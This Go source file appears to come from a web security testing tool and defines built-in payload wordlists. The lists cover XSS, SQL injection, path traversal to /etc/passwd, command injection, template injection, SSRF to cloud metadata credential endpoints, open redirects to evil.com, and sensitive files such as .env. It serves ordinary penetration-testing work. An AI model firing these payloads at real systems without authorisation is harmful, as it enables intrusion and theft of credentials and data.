package automate

import "strings"

// Wordlist — именованный встроенный набор payload'ов (базовые, как в Caido).
type Wordlist struct {
	Name     string
	Label    string
	Payloads []string
}

// Text возвращает payload'ы одной строкой (по одному на строку) — для загрузки
// в textarea.
func (w Wordlist) Text() string { return strings.Join(w.Payloads, "\n") }

// WordlistByName ищет набор по имени.
func WordlistByName(name string) (Wordlist, bool) {
	for _, w := range Wordlists {
		if w.Name == name {
			return w, true
		}
	}
	return Wordlist{}, false
}

// Wordlists — встроенные базовые наборы. Не исчерпывающие, а «стоит попробовать
// первым делом»: короткие, для быстрой ручной проверки, не замена полноценным
// словарям (SecLists и т.п.).
var Wordlists = []Wordlist{
	{Name: "xss", Label: "XSS (reflected)", Payloads: []string{
		`<script>alert(1)</script>`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`"><img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`'"><svg/onload=alert(1)>`,
		`javascript:alert(1)`,
		`</script><script>alert(1)</script>`,
		`<body onload=alert(1)>`,
		`"onmouseover="alert(1)`,
	}},
	{Name: "sqli", Label: "SQL injection", Payloads: []string{
		`'`,
		`"`,
		`' OR '1'='1`,
		`' OR 1=1--`,
		`" OR "1"="1`,
		`' OR '1'='1'--`,
		`admin'--`,
		`' UNION SELECT NULL--`,
		`' UNION SELECT NULL,NULL--`,
		`1' AND '1'='1`,
		`1' AND '1'='2`,
		`' OR SLEEP(5)--`,
		`'; WAITFOR DELAY '0:0:5'--`,
		`') OR ('1'='1`,
	}},
	{Name: "traversal", Label: "Path traversal / LFI", Payloads: []string{
		`../`,
		`../../`,
		`../../../`,
		`../../../../etc/passwd`,
		`../../../../../../etc/passwd`,
		`..%2f..%2f..%2fetc%2fpasswd`,
		`....//....//....//etc/passwd`,
		`/etc/passwd`,
		`/etc/passwd%00`,
		`../../../../windows/win.ini`,
		`..\..\..\..\windows\win.ini`,
		`php://filter/convert.base64-encode/resource=index.php`,
	}},
	{Name: "cmdi", Label: "Command injection", Payloads: []string{
		`; id`,
		`| id`,
		`|| id`,
		`& id`,
		`&& id`,
		"`id`",
		`$(id)`,
		`; sleep 5`,
		`| sleep 5`,
		`%0a id`,
		`; ping -c 3 127.0.0.1`,
		`$(sleep 5)`,
	}},
	{Name: "ssti", Label: "Template injection (SSTI)", Payloads: []string{
		`{{7*7}}`,
		`${7*7}`,
		`#{7*7}`,
		`<%= 7*7 %>`,
		`{{7*'7'}}`,
		`${{7*7}}`,
		`{{config}}`,
		`{{''.__class__}}`,
		`*{7*7}`,
	}},
	{Name: "ssrf", Label: "SSRF targets", Payloads: []string{
		`http://127.0.0.1/`,
		`http://localhost/`,
		`http://0.0.0.0/`,
		`http://[::1]/`,
		`http://127.0.0.1:22/`,
		`http://169.254.169.254/latest/meta-data/`,
		`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
		`http://metadata.google.internal/computeMetadata/v1/`,
		`file:///etc/passwd`,
		`gopher://127.0.0.1:6379/_INFO`,
	}},
	{Name: "redirect", Label: "Open redirect", Payloads: []string{
		`//evil.com`,
		`///evil.com`,
		`https://evil.com`,
		`http://evil.com`,
		`/\evil.com`,
		`https:evil.com`,
		`//evil.com/%2f..`,
		`//google.com%2F@evil.com`,
		`javascript:alert(1)`,
	}},
	{Name: "files", Label: "Частые файлы/пути", Payloads: []string{
		`admin`, `administrator`, `login`, `robots.txt`, `sitemap.xml`,
		`.git/config`, `.git/HEAD`, `.env`, `.htaccess`, `.DS_Store`,
		`backup`, `backup.zip`, `backup.tar.gz`, `config.php`, `config.json`,
		`wp-admin`, `wp-login.php`, `phpinfo.php`, `.svn/entries`,
		`server-status`, `api`, `api/v1`, `swagger.json`, `openapi.json`,
		`actuator`, `actuator/env`, `actuator/health`, `debug`, `test`,
	}},
}
